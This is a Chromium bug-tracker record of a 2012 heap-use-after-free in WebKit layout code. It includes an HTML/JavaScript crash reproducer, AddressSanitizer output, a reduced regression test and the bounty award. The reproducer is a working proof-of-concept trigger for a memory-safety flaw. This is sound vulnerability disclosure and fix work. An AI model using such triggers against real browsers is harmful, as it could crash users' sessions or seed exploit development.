# Bad cast in addChildToAnonymousColumnBlocks

| Field | Value |
|-------|-------|
| **Issue ID** | [40053372](https://issues.chromium.org/issues/40053372) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-02-06 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

crash

**VERSION**  

Chrome Version: stable, beta, trunk  

Operating System: 64 bit linux

**REPRODUCTION CASE**

<html>
<head>
<script>
onload = function() {
var el0 = document.createElement('div')
el0.style.display='-webkit-inline-box'
el0.style['-webkit-column-width']=0
document.body.appendChild(el0)
var el1 = document.createElement('div')
el1.style['-webkit-column-span']='all'
el0.appendChild(el1)
var el2 = document.createElement('span')
el0.appendChild(el2)
el2.appendChild(document.createElement('div'))
var el3 = document.createElement('div')
el3.style.display='table-column'
el0.appendChild(el3)
el0.appendChild(document.createElement('div'))
}
</script>
</head>
<body>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==10740== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffed4a64d0 at pc 0x55555a53b9b5 bp 0x7fffffff7920 sp 0x7fffffff7918  

READ of size 4 at 0x7fffed4a64d0 thread T0  

#0 0x55555a53b9b5 in WebCore::RenderDeprecatedFlexibleBox::calcHorizontalPrefWidths() ???:0  

#1 0x55555a53bf0a in WebCore::RenderDeprecatedFlexibleBox::computePreferredLogicalWidths() ???:0

0x7fffed4a64d0 is located 80 bytes inside of 96-byte region [0x7fffed4a6480,0x7fffed4a64e0)  

freed by thread T0 here:  

#0 0x55555c97aa72 in free ??:0  

#1 0x55555a515799 in WebCore::RenderBoxModelObject::~RenderBoxModelObject() ???:0  

#2 0x55555a67f4fe in WebCore::RenderTableRow::~RenderTableRow() ???:0

## Attachments

- [asan-trunk-flex0.txt](attachments/asan-trunk-flex0.txt) (text/plain; charset=us-ascii, 785 B)
- [flex0.html](attachments/flex0.html) (text/html; charset=us-ascii, 732 B)
- [asan-beta-flex0.txt](attachments/asan-beta-flex0.txt) (text/plain; charset=us-ascii, 778 B)
- [asan-stable-flex0.txt](attachments/asan-stable-flex0.txt) (text/x-c; charset=us-ascii, 10.5 KB)

## Timeline

### in...@chromium.org (2012-02-06)

this is not flexbox thingy :)


<html>
<head>
<script>
function runTest() {
    var test0 = document.createElement('div');
    test0.style['-webkit-column-count'] = 1;
    document.body.appendChild(test0);
    var test1 = document.createElement('div'); 
    test1.style['-webkit-column-span'] = 'all';
    test0.appendChild(test1);
    var test2 = document.createElement('span'); 
    test0.appendChild(test2);
    test2.appendChild(document.createElement('div'));
    var test3 = document.createElement('div');
    test3.style.display = 'table-column';
    test0.appendChild(test3);
    test0.appendChild(document.createElement('div'));
}
</script>
</head>
<body onload="runTest()">
Test passes if it does not crash.
</body>
</html>


### sc...@gmail.com (2012-02-07)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-02-07)

https://bugs.webkit.org/show_bug.cgi?id=77939

### in...@chromium.org (2012-02-07)

http://trac.webkit.org/changeset/106968

### sc...@gmail.com (2012-02-08)

Thanks as always miaubiz! Vintage bad casts, good report, etc. $1000

I'll summarize your pending rewards into a purchase order shortly. Should be a nice payout :)

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2012-02-10)

M17: http://trac.webkit.org/changeset/107325
M18: http://trac.webkit.org/changeset/107326

### sc...@gmail.com (2012-02-11)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-03-14)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/112847?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053372)*
